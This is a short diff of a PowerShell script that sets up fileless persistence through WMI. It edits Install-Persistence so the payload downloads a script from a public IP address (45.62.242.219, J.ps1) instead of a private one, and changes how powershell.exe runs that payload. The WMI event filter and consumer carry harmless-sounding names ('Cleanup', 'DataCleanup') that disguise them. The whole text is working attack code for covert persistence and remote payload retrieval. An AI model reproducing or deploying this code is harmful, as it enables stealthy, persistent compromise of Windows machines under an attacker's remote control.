@@ -4,10 +4,10 @@ Credits to @mattifestion for his awesome work on WMI and Powershell Fileless Per
 
 function Install-Persistence{
 
-    $Payload = "((new-object net.webclient).downloadstring('http://172.16.134.129:80/a'))"
+    $Payload = "((new-object net.webclient).downloadstring('http://45.62.242.219:80/J.ps1'))"
     $EventFilterName = 'Cleanup'
     $EventConsumerName = 'DataCleanup'
-    $finalPayload = "powershell.exe -nop -c `"IEX $Payload`""
+    $finalPayload = "powershell.exe -nop -c `"$Payload`""
 
     # Create event filter
     $EventFilterArgs = @{
